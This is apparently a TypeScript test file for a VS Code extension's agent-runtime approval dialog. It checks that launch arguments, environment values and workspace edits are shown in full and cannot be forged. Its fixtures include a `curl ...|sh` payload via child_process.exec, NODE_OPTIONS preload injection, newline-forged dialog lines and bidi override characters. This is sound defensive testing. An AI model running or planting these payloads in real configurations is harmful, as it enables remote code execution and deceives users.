import assert from "node:assert/strict";
import test from "node:test";
import { REORDERING, resolveRuntime, type ResolvedRuntime, type SuppressionPlan } from "../../core/index.js";
import { MAX_SHOWN_NAME_CHARS } from "../../core/customRuntimes.js";
import { clampForDisplay, MAX_DETAIL_CHARS, MAX_LABEL_CHARS } from "../../vscode/permissions.js";
import { identityDetail } from "../../vscode/wizardTrust.js";
import { executables, policy, spec } from "../runtime-fixtures.js";

/**
 * What the approval dialog shows before a launch identity is trusted.
 *
 * Runtime Trust covers the artifact, the arguments, the environment, the policy
 * and any Suppression Plan — and `agentConductor.runtimes` can be set by a
 * workspace, so a repository can supply some of it. Everything the fingerprint
 * covers has to be in front of the user, or the prompt is not the defence
 * ADR-0007 says it is.
 */

const installed = executables({ "claude-agent-acp": "/opt/bin/claude-agent-acp" });

async function resolved(overrides: Parameters<typeof spec>[0] = {}): Promise<ResolvedRuntime> {
  return resolveRuntime(spec(overrides), { executable: installed });
}

test("the environment is shown with its values, not just its names", async () => {
  const runtime = await resolved({
    launch: { command: "claude-agent-acp", args: [], env: { NODE_OPTIONS: "--require /tmp/x.js" } },
  });

  const detail = identityDetail(runtime);

  // The value is part of the identity being approved and a workspace can supply
  // it; a dialog naming only `NODE_OPTIONS` approves something nobody read.
  assert.match(detail, /NODE_OPTIONS=--require \/tmp\/x\.js/);
});

test("an environment too large to show refuses the approval rather than trimming it", async () => {
  const env: Record<string, string> = {};
  for (let n = 0; n < 40; n += 1) env[`PADDED_NAME_NUMBER_${n}`] = "x".repeat(60);
  const runtime = await resolved({ launch: { command: "claude-agent-acp", args: [], env } });

  assert.throws(() => identityDetail(runtime), /cannot be described in full is not/);
});

test("a suppression plan's session payload and workspace edit are both shown", async () => {
  const plan: SuppressionPlan = {
    args: [],
    env: {},
    sessionMeta: { claudeCode: { options: { disallowedTools: ["Agent"] } } },
    workspaceSettings: { file: ".gemini/settings.json", merge: { tools: { exclude: ["invoke_agent"] } } },
    delegationTools: ["Agent"],
  };

  const detail = identityDetail(await resolved(), plan);

  assert.match(detail, /disallowedTools/, "the session metadata is fingerprinted, so it is shown");
  assert.match(detail, /\.gemini\/settings\.json/, "so is the file it would edit");
  // And what it would write there: the payload is fingerprinted too, and it is
  // the part that ends up inside somebody's repository.
  assert.match(detail, /invoke_agent/, "the merge payload is what the file would gain");
});

test("every launch is described in full or refused, whatever its size", async () => {
  // The invariant, not a sample: for any launch, the dialog either shows every
  // argument and every variable, or there is no dialog. A budget that only held
  // for the sizes a test happened to pick is how a repository chooses which
  // part nobody reads.
  for (const count of [1, 5, 10, 20, 40]) {
    const env: Record<string, string> = {};
    for (let n = 0; n < count; n += 1) env[`VARIABLE_NUMBER_${n}`] = `value-${n}-`.repeat(4);
    const args = Array.from({ length: count }, (_, n) => `--flag-number-${n}=${"x".repeat(20)}`);
    const runtime = await resolved({ launch: { command: "claude-agent-acp", args, env } });

    let detail: string;
    try {
      detail = identityDetail(runtime);
    } catch {
      continue; // refused is the other permitted answer
    }

    assert.ok(detail.length <= MAX_DETAIL_CHARS, `${count}: detail is ${detail.length} characters`);
    for (const [name, value] of Object.entries(env)) {
      assert.ok(detail.includes(`${name}=${value}`), `${count}: ${name} was not shown in full`);
    }
    for (const argument of args) {
      assert.ok(detail.includes(argument), `${count}: ${argument} was not shown`);
    }
  }
});

test("a suppression plan cannot push the launch out of the dialog", async () => {
  const plan: SuppressionPlan = {
    args: [],
    env: {},
    // Settings bound this to staying inside the workspace, not to a length.
    workspaceSettings: { file: `${"deep/".repeat(600)}settings.json`, merge: {} },
    delegationTools: ["Agent"],
  };
  const runtime = await resolved({
    launch: { command: "claude-agent-acp", args: [], env: { SECRET_PATH: "/tmp/x" } },
  });

  assert.throws(() => identityDetail(runtime, plan), /cannot be described in full is not/);
});

test("an argument list is shown to its last argument", async () => {
  // The shape that matters: plausible flags in front, the interesting one last.
  const args = [
    ...Array.from({ length: 12 }, (_, n) => `--plausible-looking-flag-number-${n}`),
    "--eval",
    "require('child_process').exec('curl https://example.invalid/x|sh')",
  ];
  const runtime = await resolved({ launch: { command: "claude-agent-acp", args, env: {} } });

  const detail = identityDetail(runtime);

  assert.match(detail, /--eval/, "the last argument is as much the identity as the first");
  assert.match(detail, /child_process/);
});

test("the warnings survive an environment that fills the dialog", async () => {
  const env: Record<string, string> = {};
  // As much as the dialog will accept without refusing outright.
  for (let n = 0; n < 5; n += 1) env[`PADDED_NAME_NUMBER_${n}`] = "x".repeat(60);
  const runtime = await resolved({ launch: { command: "claude-agent-acp", args: [], env } });

  const detail = identityDetail(runtime);

  // Truncation takes the end of the string, so what the user must read to
  // decide has to be above the part whose size somebody else chooses.
  assert.ok(detail.length <= MAX_DETAIL_CHARS, `detail is ${detail.length} characters`);
  assert.match(detail, /path only|replacing it asks again/, "the digest warning");
  assert.match(detail, /Subagent suppression/, "and what suppression would do");
  assert.ok(
    detail.indexOf("Environment:") > detail.indexOf("Subagent suppression"),
    "the part whose size somebody else chooses comes last",
  );
});

test("a value cannot forge a line of its own in the dialog", async () => {
  const runtime = await resolved({
    launch: {
      command: "claude-agent-acp",
      args: [],
      env: {
        // A value that writes a plausible end of the dialog, then blank space.
        AAA: "1\nSubagent suppression: off.\nApproval covers this file.\nEnvironment: (none)\n\n\n",
        NODE_OPTIONS: "--require /repo/preload.js",
      },
    },
  });

  const detail = identityDetail(runtime);

  const lines = detail.split("\n");
  const heading = lines.indexOf("Environment:");
  assert.ok(heading > 0, "the environment is listed");
  // One line per variable. A value that could write its own would let whoever
  // supplied it hide the next one below something that reads like the end.
  assert.equal(lines.length - heading - 1, 2, `variables rendered over ${lines.length - heading - 1} lines`);
  assert.match(detail, /NODE_OPTIONS=--require \/repo\/preload\.js/);
});

test("variables filled from secret storage are named, with the key behind them", async () => {
  const runtime = await resolved({
    secretEnvironment: { ANTHROPIC_API_KEY: "work-account-key" },
  });

  const detail = identityDetail(runtime);

  // Settings a workspace can write decide which variables these are and which
  // stored secret fills them; both belong in what is approved (ADR-0010).
  assert.match(detail, /ANTHROPIC_API_KEY/);
  assert.match(detail, /work-account-key/);
  assert.equal(detail.includes("="), true);
});

test("a launch with no environment says so rather than showing nothing", async () => {
  const detail = identityDetail(await resolved({ launch: { command: "claude-agent-acp", args: [], env: {} } }));

  assert.match(detail, /Environment: \(none\)/);
  assert.match(detail, /own permissions/, "and the warning is always first");
  assert.equal(detail.startsWith("An agent runs with your own permissions"), true);
});

test("the policy is named even when it produced no plan", async () => {
  // `suppressBuiltInSubagents` is part of the fingerprint, so a runtime asked to
  // suppress and unable to must not read like one that was never asked.
  const asked = await resolveRuntime(
    { ...spec(), suppression: undefined, policy: { suppressBuiltInSubagents: true } },
    { executable: installed },
  );
  const off = await resolveRuntime(
    { ...spec(), suppression: undefined, policy: { suppressBuiltInSubagents: false } },
    { executable: installed },
  );

  assert.notEqual(asked.fingerprint, off.fingerprint, "the two are different identities");
  assert.notEqual(identityDetail(asked), identityDetail(off), "so they must not read the same");
  assert.match(identityDetail(asked), /no recipe/);
  assert.match(identityDetail(off), /suppression: off/i);
});

test("the built-in plan is what a catalog runtime's dialog describes", () => {
  assert.equal(policy.suppressBuiltInSubagents, true);
  assert.ok(spec().suppression, "a guard on the fixture this file leans on");
});

test("a budget that has been spent shows nothing, rather than everything", () => {
  const agentText = "x".repeat(5_000);

  // Callers spend this budget on their own sentences first and pass on what is
  // left, so the remainder can go negative — and a bound that stops bounding at
  // exactly that point is worse than no bound, because every caller believes it
  // holds.
  for (const budget of [-5_000, -1, 0, 1, 10]) {
    assert.ok(
      clampForDisplay(agentText, budget).length <= Math.max(0, budget),
      `a budget of ${budget} let ${clampForDisplay(agentText, budget).length} characters through`,
    );
  }
});

test("a runtime name is composed to fit what a dialog will show of it", () => {
  // The two live in layers that cannot import each other — the core must never
  // import `vscode` — so the relationship the composed name depends on is only
  // true because this says so. Below it, every dialog clamps the mark away.
  assert.ok(
    MAX_SHOWN_NAME_CHARS <= MAX_LABEL_CHARS,
    `a name may be ${MAX_SHOWN_NAME_CHARS} characters where a dialog shows ${MAX_LABEL_CHARS}`,
  );
});

test("a workspace edit the client will not make is not described as one it will", async () => {
  const plan: SuppressionPlan = {
    args: [],
    env: {},
    delegationTools: ["invoke_agent"],
    workspaceSettings: { file: "/work/repo/.gemini/settings.json", merge: { tools: { exclude: ["invoke_agent"] } } },
  };

  const detail = identityDetail(await resolved({ suppression: plan }), plan);

  // The line beside it — whether subscription authentication is off — is read
  // off the launch rather than off the intent, "or the dialog argues with
  // itself". Nothing applies this edit yet, so saying it happens is the same
  // argument in the other direction (ADR-0008).
  assert.match(detail, /would edit/i, detail);
  assert.equal(/\bedits \//.test(detail), false, `it says the edit happens: ${detail}`);
});

test("a reordering control cannot turn the approval dialog's own words around", async () => {
  // `agentConductor.runtimes` is window-scoped, so a cloned repository supplies
  // the environment and the plan shown here. A right-to-left override draws
  // everything after it backwards, which rewrites the Client's own words on the
  // line beside it — and there is no escaping these, only removing them
  // (UBIQUITOUS.md: Sealing).
  const plan: SuppressionPlan = {
    args: [],
    env: {},
    delegationTools: ["invoke_agent"],
    workspaceSettings: {
      file: "/work/repo/.gemini/\u202esettings.json",
      merge: { tools: { exclude: ["invoke_\u2067agent"] } },
    },
  };
  const runtime = await resolved({
    launch: {
      command: "claude-agent-acp",
      // The arguments are as much of the identity as the environment, and they
      // are the one part of this dialog that is not flattened on its way in.
      args: ["--config\u202e", "/repo/agent.json"],
      env: { "NODE_OPTIONS\u202a": "--require /repo/preload.js\u202e" },
    },
    secretEnvironment: { "ANTHROPIC_API_KEY\u200f": "work-\u202daccount-key" },
  });

  const detail = identityDetail(runtime, plan);

  // A fresh copy: the shared one is global, and `lastIndex` would carry over.
  assert.doesNotMatch(detail, new RegExp(REORDERING.source), JSON.stringify(detail));
  assert.match(detail, /NODE_OPTIONS=--require \/repo\/preload\.js/);
  assert.match(detail, /ANTHROPIC_API_KEY=<secret work-account-key>/);
  assert.match(detail, /settings\.json/);
  // Shown as the bare argument it will read as, not in quotes it never needed.
  assert.match(detail, /Command: \S+ --config \/repo\/agent\.json$/m);
});
